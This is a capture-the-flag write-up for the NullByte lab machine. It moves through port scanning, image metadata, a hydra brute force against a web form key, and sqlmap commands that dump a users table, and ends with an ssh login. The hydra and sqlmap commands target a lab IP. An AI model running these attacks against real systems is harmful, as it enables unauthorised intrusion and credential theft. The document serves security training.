## NullByte

**Vulnerability: Steganography, SQL Injection, and PATH Manipulation.**


find the ip adress

<img width="668" height="501" alt="image" src="https://github.com/user-attachments/assets/76ab5fc0-0f46-4ba9-a4a5-2a1d6b387719" />

ennumerate the ports

<img width="1251" height="742" alt="image" src="https://github.com/user-attachments/assets/dc1e3ac7-7fb9-47a1-a4f5-98057b2b41da" />

visit the site 

<img width="737" height="523" alt="image" src="https://github.com/user-attachments/assets/c8b03a07-e5da-418d-b17c-067e8aef4470" />

do a nikto scan 

<img width="1516" height="625" alt="image" src="https://github.com/user-attachments/assets/366140a4-75c4-437a-b37f-caa3b45f735b" />

import the image and run a scan on the metadata

<img width="668" height="501" alt="image" src="https://github.com/user-attachments/assets/b83fe76b-2997-443d-aac3-42e54468cb29" />

use the comment as a path since that is how its usually done in ctf 

<img width="1075" height="445" alt="image" src="https://github.com/user-attachments/assets/3e006a8e-3e31-4f4b-b865-2f99f89b3d7a" />

check the page source for hidden key

<img width="611" height="187" alt="image" src="https://github.com/user-attachments/assets/bbb49d21-0c9c-4e2d-8bba-3bca950454e5" />

attack using bruteforcing  , using hydra

<img width="1445" height="217" alt="image" src="https://github.com/user-attachments/assets/f46b8956-984c-4ad4-9268-bf893bc49752" />

```bash
hydra -l a -P ./rockyou.txt 192.168.56.106 http-post-form "/kzMb5nVYJw/index.php:key=^PASS^:invalid key"
```

got the password as **elite**

<img width="1075" height="445" alt="image" src="https://github.com/user-attachments/assets/5816312a-3b7c-4873-a802-8ff2234278d7" />
<img width="1075" height="445" alt="image" src="https://github.com/user-attachments/assets/7ae94df1-ab62-46d7-89ed-2ebe167df5c2" />

since it shows **data fetched**  for both true and false case , blind sqli wont work

<img width="387" height="552" alt="image" src="https://github.com/user-attachments/assets/90131a78-07f9-4a85-9982-5ecba648fede" />

```bash
sqlmap -u "http://192.168.56.106/kzMb5nVYJw/420search.php?usrtosearch=test" --dbs
```
```sql
UNION SELECT schema_name FROM information_schema.schemata
```

```bash
sqlmap -u "http://192.168.56.106/kzMb5nVYJw/420search.php?usrtosearch=a" -D seth --tables
```
```sql
SELECT table_name 
FROM information_schema.tables 
WHERE table_schema='seth';
```

```bash
sqlmap -u "http://192.168.56.106/kzMb5nVYJw/420search.php?usrtosearch=a" -D seth -T users --dump
```
<img width="1083" height="398" alt="image" src="https://github.com/user-attachments/assets/4620e3ef-46f7-47a4-bac4-47109440063f" />

decrypt the password using cyberchef

<img width="1474" height="751" alt="image" src="https://github.com/user-attachments/assets/56110ea4-11fd-4bd9-895c-cac478ae53c2" />
<img width="983" height="182" alt="image" src="https://github.com/user-attachments/assets/1c1843b4-5832-4ea7-bac1-08b62c2507c4" />

now iuse the credentials to loginn using ssh

![WhatsApp Image 2026-03-12 at 10 15 48 PM](https://github.com/user-attachments/assets/3eb7258f-f7af-4134-81eb-14c4f1512e3a)

<img width="1072" height="599" alt="image" src="https://github.com/user-attachments/assets/be655a36-7de3-439f-9726-f39a2ed48a60" />


<img width="697" height="522" alt="image" src="https://github.com/user-attachments/assets/07df6f4a-e753-4e71-a5ae-7f26173729dc" />


